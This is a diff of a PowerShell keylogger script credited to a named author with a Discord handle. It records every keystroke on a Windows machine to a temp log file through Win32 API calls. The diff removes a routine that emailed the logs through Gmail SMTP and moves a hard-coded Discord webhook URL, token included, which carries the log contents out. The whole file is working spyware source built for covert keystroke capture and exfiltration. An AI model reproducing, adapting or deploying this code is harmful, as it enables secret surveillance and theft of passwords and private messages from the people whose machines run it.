@@ -1,23 +1,11 @@
 # MADE BY SYKE
 # Discord: syke#1166 / Syke#1166
 
-$webhookUri = 'https://discord.com/api/webhooks/941122393366204447/bqjN-dHZTcO1enFJ51U0XkPTlK_nHMrm7J8PTvxVnbisAlSZSXSFitnrJsqY6eN_tub9'
- $Body = @{
-  
-  'content' = get-content $env:temp/keylogger.log
-}
+
 
 
 # keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
-
-  # email process
-  $logs = Get-Content "$logFile"
-  $subject = "$env:UserName logs"
-  $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
-  $smtp.EnableSSL = $true
-  $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
-  $smtp.Send($email, $email, $subject, $logs);
 
   # generate log file
   $generateLog = New-Item -Path $logFile -ItemType File -Force
@@ -36,6 +24,12 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
  # set up API
  $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
+
+    $webhookUri = 'https://discord.com/api/webhooks/941122393366204447/bqjN-dHZTcO1enFJ51U0XkPTlK_nHMrm7J8PTvxVnbisAlSZSXSFitnrJsqY6eN_tub9'
+    $Body = @{
+  
+  'content' = get-content $env:temp/keylogger.log
+    }
 
   # attempt to log keystrokes
   try {
@@ -63,10 +57,11 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
             # add logged key to file
             [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
-          }
-        }
-      }
-    }
+             }
+         }
+         }
+         }
+  }
   }
   
 
